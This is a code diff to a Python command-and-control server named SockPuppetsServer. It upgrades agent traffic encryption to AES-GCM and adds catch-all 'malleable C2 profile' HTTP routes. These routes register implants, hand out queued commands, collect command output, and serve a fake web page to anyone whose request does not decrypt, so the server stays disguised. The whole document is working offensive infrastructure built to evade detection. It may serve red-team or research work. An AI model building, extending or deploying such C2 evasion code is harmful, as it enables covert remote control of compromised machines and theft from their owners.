@@ -23,6 +23,16 @@ import threading
 
 try:
     from aiohttp import web
+    import aiohttp.tcp_helpers
+    import aiohttp.web_protocol
+    _orig_keepalive = aiohttp.tcp_helpers.tcp_keepalive
+    def _safe_keepalive(transport):
+        try:
+            _orig_keepalive(transport)
+        except OSError:
+            pass
+    aiohttp.tcp_helpers.tcp_keepalive = _safe_keepalive
+    aiohttp.web_protocol.tcp_keepalive = _safe_keepalive
 except ImportError:
     web = None
 
@@ -108,30 +118,53 @@ class SockPuppetsServer:
             return ""
 
     def simple_encrypt(self, data: str, key: bytes = None) -> str:
-        """XOR-based obfuscation with optional per-agent key"""
+        """AES-256-GCM encryption with XOR fallback"""
         key = key or self.encryption_key
-        encoded = data.encode('latin-1')
-        encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
-        return base64.b64encode(encrypted).decode()
+        try:
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            aes_key = self._derive_aes_key(key)
+            nonce = os.urandom(12)
+            aesgcm = AESGCM(aes_key)
+            ct = aesgcm.encrypt(nonce, data.encode('utf-8'), None)
+            return base64.b64encode(b'AES1' + nonce + ct).decode()
+        except ImportError:
+            encoded = data.encode('latin-1')
+            encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
+            return base64.b64encode(encrypted).decode()
 
     def simple_decrypt(self, data: str, key: bytes = None) -> str:
-        """Decrypt XOR obfuscation with optional per-agent key"""
+        """AES-256-GCM decryption with XOR fallback"""
         key = key or self.encryption_key
-        decoded = base64.b64decode(data.encode())
-        decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
+        raw = base64.b64decode(data.encode())
+        if raw[:4] == b'AES1':
+            try:
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                nonce = raw[4:16]
+                ct = raw[16:]
+                aes_key = self._derive_aes_key(key)
+                aesgcm = AESGCM(aes_key)
+                pt = aesgcm.decrypt(nonce, ct, None)
+                return pt.decode('utf-8')
+            except Exception:
+                pass
+        decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(raw))
         return decrypted.decode('latin-1')
 
+    @staticmethod
+    def _derive_aes_key(key: bytes) -> bytes:
+        """Derive a 32-byte AES key from the agent key using SHA-256"""
+        import hashlib
+        return hashlib.sha256(key).digest()
+
     def try_decrypt(self, data: str) -> tuple:
-        """Try all known keys to decrypt data. Returns (decrypted_str, key_used).
-        Raises ValueError if no key works."""
+        """Try all known keys to decrypt data (AES-GCM first, XOR fallback).
+        Returns (decrypted_str, key_used). Raises ValueError if no key works."""
         for key in self.known_keys:
             try:
-                decoded = base64.b64decode(data.encode())
-                decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
-                result = decrypted.decode('latin-1')
-                json.loads(result)  # validate it's real JSON
+                result = self.simple_decrypt(data, key)
+                json.loads(result)
                 return result, key
-            except (json.JSONDecodeError, UnicodeDecodeError, Exception):
+            except Exception:
                 continue
         raise ValueError("No known key could decrypt the message")
 
@@ -477,18 +510,158 @@ class SockPuppetsServer:
     # ──────────────────────────────────────────────
 
     def _create_http_app(self) -> 'web.Application':
-        """Create aiohttp application with disguised routes"""
+        """Create aiohttp application with flexible routing for malleable C2 profiles.
+        Accepts any POST/GET path — routes by decrypting payload and inspecting msg type."""
         if web is None:
             raise ImportError("aiohttp is required for HTTP/HTTPS listeners. Install with: pip install aiohttp")
 
         app = web.Application()
-        app.router.add_post('/submit-form', self._http_handle_register)
-        app.router.add_post('/api/v1/update', self._http_handle_checkin)
-        app.router.add_post('/upload', self._http_handle_results)
-        app.router.add_get('/health', self._http_handle_heartbeat)
-        # Serve a fake index page for browser visits
-        app.router.add_get('/', self._http_handle_index)
+        # Catch-all POST handler — malleable profiles use varying URIs
+        app.router.add_post('/{path:.*}', self._http_handle_any_post)
+        # Catch-all GET handler for heartbeat and index
+        app.router.add_get('/{path:.*}', self._http_handle_any_get)
         return app
+
+    async def _http_handle_any_post(self, request: 'web.Request') -> 'web.Response':
+        """Route POST requests by decrypting payload and inspecting message type.
+        Supports malleable C2 profiles that use varying URI paths."""
+        try:
+            body = await request.text()
+            if not body.strip():
+                return await self._http_handle_index(request)
+
+            decrypted, key_used = self.try_decrypt(body)
+            data = json.loads(decrypted)
+            msg_type = data.get('type', '')
+
+            if msg_type == 'register':
+                return await self._http_do_register(request, data, key_used)
+            elif msg_type == 'checkin':
+                return await self._http_do_checkin(request, data, key_used)
+            elif msg_type == 'response':
+                return await self._http_do_results(request, data, key_used)
+            else:
+                return web.Response(status=400)
+
+        except ValueError:
+            # Decryption failed — not a C2 message, serve fake page
+            return await self._http_handle_index(request)
+        except Exception as e:
+            logger.error(f"HTTP handler error: {e}")
+            return web.Response(status=500)
+
+    async def _http_handle_any_get(self, request: 'web.Request') -> 'web.Response':
+        """Route GET requests — heartbeat or fake index"""
+        agent_id = request.query.get('sid', '')
+        if agent_id and agent_id in self.agents:
+            return await self._http_handle_heartbeat(request)
+        return await self._http_handle_index(request)
+
+    async def _http_do_register(self, request, data, key_used):
+        """Process agent registration from parsed data"""
+        agent_id = str(uuid.uuid4())[:8]
+        metadata = data.get('metadata', {})
+        peername = request.remote
+        metadata['ip'] = peername or 'Unknown'
+        transport_type = 'https' if request.secure else 'http'
+        agent = self.register_agent_common(agent_id, metadata, transport_type)
+        agent.encryption_key = key_used
+        response = {'type': 'registered', 'agent_id': agent_id, 'status': 'success'}
+        encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
+        return web.Response(text=encrypted_response, content_type='text/html')
+
+    async def _http_do_checkin(self, request, data, key_used):
+        """Process agent checkin from parsed data"""
+        agent_id = data.get('agent_id')
+        if not agent_id:
+            return web.Response(status=400)
+
+        if agent_id in self.agents:
+            agent = self.agents[agent_id]
+            agent.last_seen = datetime.now()
+            transport_type = 'https' if request.secure else 'http'
+            agent.transport_type = transport_type
+            metadata = data.get('metadata', {})
+            if metadata:
+                agent.mode = metadata.get('mode', agent.mode)
+                agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
+                agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
+
+            results = data.get('results') or []
+            for result in results:
+                output = result.get('output', '')
+                command = result.get('command', '')
+                timestamp = result.get('timestamp', '')
+                if agent.mode == 'beacon':
+                    agent.pending_results.append({
+                        'command': command, 'output': output,
+                        'timestamp': timestamp, 'received_at': datetime.now().isoformat()
+                    })
+                else:
+                    try:
+                        agent.response_queue.put_nowait(output)
+                    except asyncio.QueueFull:
+                        pass
+
+            commands = []
+            if agent.mode == 'beacon':
+                while not agent.command_queue.empty():
+                    try:
+                        cmd = agent.command_queue.get_nowait()
+                        commands.append({
+                            'type': 'command', 'command': cmd,
+                            'timestamp': datetime.now().isoformat()
+                        })
+                    except asyncio.QueueEmpty:
+                        break
+            else:
+                try:
+                    cmd = await asyncio.wait_for(agent.command_queue.get(), timeout=30.0)
+                    commands.append({
+                        'type': 'command', 'command': cmd,
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except asyncio.TimeoutError:
+                    pass
+
+            response = {'type': 'commands', 'commands': commands} if commands else {'type': 'no_commands'}
+            encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
+            return web.Response(text=encrypted_response, content_type='text/html')
+        else:
+            new_id = str(uuid.uuid4())[:8]
+            metadata = data.get('metadata', {})
+            peername = request.remote
+            metadata['ip'] = peername or 'Unknown'
+            transport_type = 'https' if request.secure else 'http'
+            agent = self.register_agent_common(new_id, metadata, transport_type)
+            agent.encryption_key = key_used
+            response = {'type': 'registered', 'agent_id': new_id, 'status': 'success'}
+            encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
+            return web.Response(text=encrypted_response, content_type='text/html')
+
+    async def _http_do_results(self, request, data, key_used):
+        """Process command results from parsed data"""
+        agent_id = data.get('agent_id')
+        if not agent_id or agent_id not in self.agents:
+            return web.Response(status=404)
+        agent = self.agents[agent_id]
+        agent.last_seen = datetime.now()
+        output = data.get('output', '')
+        command = data.get('command', '')
+        timestamp = data.get('timestamp', '')
+        if agent.mode == 'beacon':
+            agent.pending_results.append({
+                'command': command, 'output': output,
+                'timestamp': timestamp, 'received_at': datetime.now().isoformat()
+            })
+        else:
+            try:
+                agent.response_queue.put_nowait(output)
+            except asyncio.QueueFull:
+                pass
+        response = {'type': 'result_ack', 'status': 'success'}
+        encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
+        return web.Response(text=encrypted_response, content_type='text/html')
 
     async def _http_handle_index(self, request: 'web.Request') -> 'web.Response':
         """Serve a fake page for browser visitors"""
@@ -1294,9 +1467,6 @@ if __name__ == '__main__':
     parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
     parser.add_argument('--port', type=int, default=8443, help='Port to bind to')
     parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key')
-    parser.add_argument('--ssl', action='store_true', help='Enable WSS (TLS) mode')
-    parser.add_argument('--cert', type=str, help='Path to SSL certificate file')
-    parser.add_argument('--cert-key', type=str, help='Path to SSL private key file')
     args = parser.parse_args()
 
-    asyncio.run(start_server(args.host, args.port, args.key, args.ssl, args.cert, getattr(args, 'cert_key', None)))
+    asyncio.run(start_server(args.host, args.port, args.key))
